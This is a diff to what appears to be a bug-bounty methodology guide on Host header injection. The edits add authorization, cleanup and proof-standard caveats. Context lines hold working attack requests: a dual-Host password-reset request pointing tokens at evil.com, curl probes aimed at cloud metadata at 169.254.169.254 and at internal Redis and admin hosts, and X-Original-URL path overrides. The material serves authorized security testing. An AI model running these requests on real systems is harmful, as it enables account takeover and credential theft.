@@ -54,7 +54,7 @@ verified — a missing citation is always better than a wrong one.
 
 ## Crown Jewel Targets
 
-Host header injection that reaches password reset links = Critical (ATO for any user).
+Reset-link manipulation has context-dependent severity; an owned-account test alone does not establish takeover of any user. State required victim interaction, token validation and demonstrated scope.
 
 **Highest-value chains:**
 - **Password reset poisoning → ATO** — server builds the reset link from the request Host;
@@ -97,6 +97,8 @@ X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class
 
 ## Step-by-Step Hunting Methodology
 
+Use an owner-approved isolated cache namespace/lab and disposable owned accounts. Before any cache write verify the cache-buster is actually keyed; otherwise stop rather than poison a shared production key. Confirm request limits, expiry/purge and cleanup. Use an approved owned callback domain instead of third-party example domains; minimize/redact token captures and never request real cloud credentials or contact internal services outside explicit scope. A harmless owned callback usually suffices to show routing behavior. OOB DNS alone proves resolution, not HTTP access or credential impact.
+
 > Always test against **your own** registered test account. Never request another user's reset.
 
 ### Phase 1 — Password Reset Poisoning
@@ -121,7 +123,7 @@ curl -s -X POST https://$TARGET/forgot-password \
 
 # 1d. Dual-Host / Host override smuggling: some stacks read the SECOND Host
 printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.com' "$TARGET" \
-  | openssl s_client -quiet -connect $TARGET:443 2>/dev/null
+  | openssl s_client -quiet -connect "$TARGET:443" -servername "$TARGET" -verify_return_error
 
 # 1e. Absolute-URL injection: keep real Host, append attacker host so the
 #     reset link becomes https://TARGET.evil.com/... or routes the token out
@@ -143,8 +145,7 @@ have proof — see Validation.
 
 Mechanism: this is a **reflection** bug, not an OOB bug. The injected host must be *reflected into
 the response body* (an absolute URL, script `src`, `<link href>`, `<base href>`, redirect
-`Location`, or canonical/og:url) **and** that response must be **cached on a key you do not
-control**. No Collaborator callback is expected from the cache test itself — only later, if a
+`Location`, or canonical/og:url) **and** that response must be **cached and reusable by another permitted request on the same verified test key**. No Collaborator callback is expected from the cache test itself — only later, if a
 victim's browser loads the poisoned absolute URL.
 
 ```bash
@@ -157,7 +158,7 @@ curl -s https://$TARGET/ \
 curl -sI "https://$TARGET/?cb=$RANDOM" \
   | grep -iE "cache-control|cf-cache-status|x-cache|age|via|surrogate|vary"
 #   Look for: X-Cache/CF-Cache-Status: HIT, nonzero Age, Via: varnish/fastly/cloudfront.
-#   Check Vary: — if Vary does NOT include X-Forwarded-Host, the header is UNKEYED → poisonable.
+#   Check Vary as one clue only; absence does not prove the CDN excludes a header from its internal cache key.
 
 # 2c. Prove poisoning: poison once, then fetch CLEAN (no injected header) on same key.
 URL="https://$TARGET/?cb=poison$RANDOM"
@@ -193,7 +194,7 @@ curl -s "https://$TARGET/computeMetadata/v1/" \
 curl -s "https://$TARGET/metadata/instance?api-version=2021-02-01" \
   -H "Host: 169.254.169.254" -H "Metadata: true"
 
-# Internal hostname / port routing:
+# Internal hostname / port routing (HTTP proxy to a Redis port does not prove Redis command execution):
 curl -s "https://$TARGET/" -H "Host: localhost:6379"   # Redis behind the proxy
 curl -s "https://$TARGET/" -H "Host: internal-admin.svc.cluster.local"
 
@@ -210,7 +211,8 @@ stays put; you are bypassing an **edge path ACL**, not steering an upstream. Kee
 # Reach an internal/blocked path the edge thought it denied. Real Host stays.
 curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Original-URL: /admin"
 curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metrics"
-# Diff against a direct GET /admin (which the edge blocks) — a different status/body proves override.
+# Compare direct and overridden requests; status/body difference alone does not prove admin access.
+# Verify a harmless distinctive response from the authorized test resource.
 ```
 
 > The old probe `Host: 169.254.169.254` + `X-Original-URL: /latest/meta-data/` was wrong: those
@@ -270,7 +272,7 @@ still returns the attacker payload → shared-cache poisoning proven. Demote to 
 `MISS`/`Age:0` only.
 ✅ **Routing SSRF:** real response body from `169.254.169.254` / internal host, **or** an OOB
 DNS/HTTP hit on your Collaborator from the front-end (blind case).
-✅ **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.
+✅ **Path-override:** a distinctive authorized resource response, supported by logs if available, confirms override; status difference alone is inconclusive.
 ✅ **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured),
 not merely reflected.
 
